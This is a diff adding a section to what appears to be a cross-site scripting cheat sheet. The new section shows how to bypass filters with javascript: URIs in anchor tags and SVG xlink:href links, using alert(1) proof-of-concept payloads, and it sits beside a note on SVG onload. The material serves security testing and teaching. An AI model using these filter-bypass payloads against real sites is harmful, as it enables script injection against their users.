@@ -214,4 +214,10 @@ If the web application strips traditional <script> tags, you can use non-script 
 The <svg> element is often allowed by filters because it's a vector graphic element.
 The onload event executes JavaScript when the SVG is loaded.
 ```
+### 2️⃣ When Input Is Reflected as Plain Text (Use SVG Vectors)
+```
+If the input is reflected as-is without being treated as HTML, you can trick the parser using SVG vectors or JavaScript URIs.
 
+Payload Example               :<a href="javascript:alert(1)">Click Me!</a>
+Or, if links are sanitized    :<svg><a xlink:href="javascript:alert(1)">Click Me!</a></svg>
+```
